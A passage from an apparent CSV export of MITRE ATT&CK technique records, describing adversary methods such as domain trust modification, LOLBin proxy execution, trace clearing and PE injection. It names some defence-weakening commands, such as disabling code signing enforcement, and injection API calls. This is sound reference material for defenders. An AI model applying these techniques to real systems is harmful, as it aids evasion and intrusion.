attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee,2,T1484.002,Trust Modification,"Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.

Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002) without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) 

An adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant.(Citation: Okta Cross-Tenant Impersonation 2023) This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.(Citation: AWS re Inforce Trust Mod)","Identity Provider, Windows",FALSE,FALSE,2020-12-28T21:59:02Z
attack-pattern--274770e0-2612-4ccf-a678-ef8e7bad365d,2,T1586.001,Social Media Accounts,"Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. 

A variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.

Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.

Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",PRE,FALSE,FALSE,2020-10-01T01:18:35Z
attack-pattern--2c4d4e92-0ccf-4a97-b54c-86d662988a53,2,T1137,Office Application Startup,"Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.

A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)","Windows, Office Suite",FALSE,FALSE,2017-12-14T16:46:06Z
attack-pattern--2cd950a6-16c4-404a-aa01-044322395107,2,T1218.004,InstallUtil,"Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>.

InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)",Windows,FALSE,FALSE,2020-01-23T19:09:48Z
attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee,2,T1222.001,Windows Permissions,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)

Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",Windows,FALSE,FALSE,2020-02-04T19:17:41Z
attack-pattern--3975dbb5-0e1e-4f5b-bae1-cf2ab84b46dc,2,T1070.007,Clear Network Connection History and Configurations,"Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.

Network connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):

* <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code>

Windows may also store information about recent RDP connections in files such as <code>C:\Users\\%username%\Documents\Default.rdp</code> and `C:\Users\%username%\AppData\Local\Microsoft\Terminal
Server Client\Cache\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)

Malicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1686) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.","Linux, macOS, Windows, Network Devices",FALSE,FALSE,2022-06-15T18:00:04Z
attack-pattern--39cc9f64-cf74-4a48-a4d8-fe98c54a02e0,2,T1584.003,Virtual Private Server,"Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig)

Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",PRE,FALSE,FALSE,2020-10-01T00:55:17Z
attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e,2,T1202,Indirect Command Execution,"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (`pcalua.exe`), components of the Windows Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts.(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov 2017)(Citation: Secure Team - Scriptrunner.exe)(Citation: SS64)(Citation: Bleeping Computer - Scriptrunner.exe) Adversaries may also abuse the `ssh.exe` binary to execute malicious commands via the `ProxyCommand` and `LocalCommand` options, which can be invoked via the `-o` flag or by modifying the SSH config file.(Citation: Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey Bot)

Adversaries may abuse these features for [Stealth](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",Windows,FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--3d52e51e-f6db-4719-813c-48002a99f43a,2,T1586.003,Cloud Accounts,"Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Additionally, cloud-based messaging services such as Twilio, SendGrid, AWS End User Messaging, AWS SNS (Simple Notification Service), or AWS SES (Simple Email Service) may be leveraged for spam or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)(Citation: Netcraft SendGrid 2024) Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)

A variety of methods exist for compromising cloud accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, conducting [Password Spraying](https://attack.mitre.org/techniques/T1110/003) attacks, or attempting to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: MSTIC Nobelium Oct 2021) Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) between service providers and their customers.(Citation: MSTIC Nobelium Oct 2021)",PRE,FALSE,FALSE,2022-05-27T14:30:01Z
attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6,2,T1560.002,Archive via Library,"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.

Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.","Linux, macOS, Windows",FALSE,FALSE,2020-02-20T21:08:52Z
attack-pattern--438c967d-3996-4870-bfc2-3954752a1927,2,T1070.008,Clear Mailbox Data,"Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. 

Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx man page)

Adversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.(Citation: Microsoft OAuth Spam 2022)","Linux, macOS, Office Suite, Windows",FALSE,FALSE,2022-07-08T21:04:03Z
attack-pattern--457c7820-d331-465a-915e-42f85500ccc4,2,T1218,System Binary Proxy Execution,"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)","Linux, macOS, Windows",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--49fca0d2-685d-41eb-8bd4-05451cc3a742,2,T1480.002,Mutual Exclusion,"Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time.(Citation: Microsoft Mutexes)

While local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes.(Citation: Microsoft Mutexes) By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised.(Citation: Sans Mutexes 2012)

In Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to acquire the lock, it continues to execute; if it fails, it exits to avoid creating a second instance of itself.(Citation: Intezer RedXOR 2021)(Citation: Deep Instinct BPFDoor 2023)

Mutex names may be hard-coded or dynamically generated using a predictable algorithm.(Citation: ICS Mutexes 2015)","Linux, macOS, Windows",FALSE,FALSE,2024-09-19T14:00:03Z
attack-pattern--4cbc6a62-9e34-4f94-8a19-5c1a11392a49,2,T1218.003,CMSTP,"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.

CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)",Windows,FALSE,FALSE,2020-01-23T18:27:30Z
attack-pattern--506f6f49-7045-4156-9007-7474cb44ad6d,2,T1608.002,Upload Tool,"Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.

Tools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation: Dell TG-3390) Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Intezer App Service Phishing)

Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",PRE,FALSE,FALSE,2021-03-17T20:31:07Z
attack-pattern--55fc4df0-b42c-479a-b860-7a6761bcaad0,2,T1596,Search Open Technical Databases,"Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan)

Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",PRE,FALSE,FALSE,2020-10-02T16:56:05Z
attack-pattern--565275d5-fcc3-4b66-b4e7-928e4cac6b8c,2,T1553.006,Code Signing Policy Modification,"Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. 

Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)

Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014)

To gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader)","macOS, Windows",FALSE,FALSE,2021-04-23T01:04:57Z
attack-pattern--57a3d31a-d04f-4663-b2da-7df8ec3f8c9d,2,T1580,Cloud Infrastructure Discovery,"An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.

Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket’s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft AZ CLI) In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)

An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources. (Citation: AWS Describe DB Instances) Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.",IaaS,FALSE,FALSE,2020-08-20T17:51:25Z
attack-pattern--63b24abc-5702-4745-b1e4-ac70b20a43f2,2,T1681,Search Threat Vendor Data,"Threat actors may seek information/indicators from closed or open threat intelligence sources gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. These reports may include descriptions of behavior, detailed breakdowns of attacks, atomic indicators such as malware hashes or IP addresses, timelines of a group’s activity, and more. Adversaries may change their behavior when planning their future operations. 

Adversaries have been observed replacing atomic indicators mentioned in blog posts in under a week.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023) Adversaries have also been seen searching for their own domain names in threat vendor data and then taking them down, likely to avoid seizure or further investigation.(Citation: Sentinel One Contagious Interview ClickFix September 2025)

This technique is distinct from [Threat Intel Vendors](https://attack.mitre.org/techniques/T1597/001) in that it describes threat actors performing reconnaissance on their own activity, not in search of victim information.",PRE,FALSE,FALSE,2025-09-26T15:42:30Z
attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e,2,T1557.001,Name Resolution Poisoning and SMB Relay,"By responding to LLMNR/NBT-NS/mDNS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system.(Citation: BlackCat ransomware) This activity may be used to collect or relay authentication materials. 

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.(Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)

Multicast Domain Name System(mDNS) is a zero-configuration service used to resolve hostnames to IP addresses with “.local” as a top-level domain. MDNS is based upon Domain Name System (DNS) format and allows hosts on the same network segment to perform name resolution for other hosts, using multicast.(Citation: mDNS RFC)

Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137)/mDNS (UDP 5353) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.

In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various other protocols, such as LDAP, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. 

Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)",Windows,FALSE,FALSE,2020-02-11T19:08:51Z
attack-pattern--677569f9-a8b0-459e-ab24-7f18091fa7bf,2,T1134.002,Create Process with Token,"Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)

Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.

While this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",Windows,FALSE,FALSE,2020-02-18T16:48:56Z
attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e,2,T1056.003,Web Portal Capture,"Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.

This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)","Linux, macOS, Windows",FALSE,FALSE,2020-02-11T18:59:50Z
attack-pattern--6a5d222a-a7e0-4656-b110-782c33098289,2,T1598.004,Spearphishing Voice,"Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1684/001)) and/or creating a sense of urgency or alarm for the recipient.

All forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or ""vishing""), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams)

Victims may also receive phishing messages that direct them to call a phone number (""callback phishing"") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)

Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.",PRE,FALSE,FALSE,2023-09-07T21:48:39Z
attack-pattern--6a6f9892-c46a-46db-b331-c09a99200fcf,2,T1683.001,Written Content,"Adversaries may create or tailor written materials to support targeting and malicious operations. Content may include phishing lures, fraudulent financial communications, fabricated job postings, fabricated employment credentials and documentation, decoy documents, social media persona content, and supporting narratives used to sustain fabricated personas over time.(Citation: GenAI Phishing)(Citation: GTIG AI Threat Tracker) Content may be authored manually, commissioned through third parties, or produced using AI-assisted tools.

Written materials may impersonate legitimate government correspondence, diplomatic communications, or internal organizational documents to support targeting efforts. AI-assisted tools may also be used to tailor content to specific targets, industries, or regions. For example, adversaries may leverage AI to translate content into a target's native language or mimic the communication style of trusted senders.

Written content produced through these methods may be used in support of other techniques, such as [Phishing](https://attack.mitre.org/techniques/T1660), [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003), [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Social Engineering](https://attack.mitre.org/techniques/T1684), [Financial Theft](https://attack.mitre.org/techniques/T1657), or [Establish Accounts](https://attack.mitre.org/techniques/T1585).

Written content does not include malicious code or scripts; for development of malicious code and scripts, see [Develop Capabilities](https://attack.mitre.org/techniques/T1587).",PRE,FALSE,FALSE,2026-03-25T14:26:19Z
attack-pattern--70857657-bd0b-4695-ad3e-b13f92cac1b4,2,T1578.003,Delete Cloud Instance,"An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.

An adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)",IaaS,FALSE,FALSE,2020-06-16T17:23:06Z
attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662,2,T1055.002,Portable Executable Injection,"Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. 

PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017) 

